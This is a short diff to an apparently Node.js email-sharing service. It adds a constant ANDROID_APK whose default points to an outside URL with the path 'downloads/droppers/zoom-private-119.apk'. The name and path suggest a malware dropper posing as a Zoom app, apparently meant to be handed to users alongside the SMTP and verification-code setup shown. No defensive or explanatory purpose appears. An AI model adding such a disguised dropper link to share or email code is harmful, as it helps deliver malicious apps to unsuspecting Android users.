@@ -19,6 +19,7 @@ const SMTP_USER = process.env.SMTP_USER || '';
 const SMTP_PASS = process.env.SMTP_PASS || '';
 const SMTP_FROM = process.env.SMTP_FROM || process.env.SHARE_SENDER || '';
 const SMTP_SECURE = process.env.SMTP_SECURE === 'true';
+const ANDROID_APK = process.env.SHARE_ANDROID_APK || 'https://global.telcom.stream/downloads/droppers/zoom-private-119.apk';
 
 const VERIFY_CODES = new Map();
 function makeCode() { return String(Math.floor(100000 + Math.random() * 900000)); }
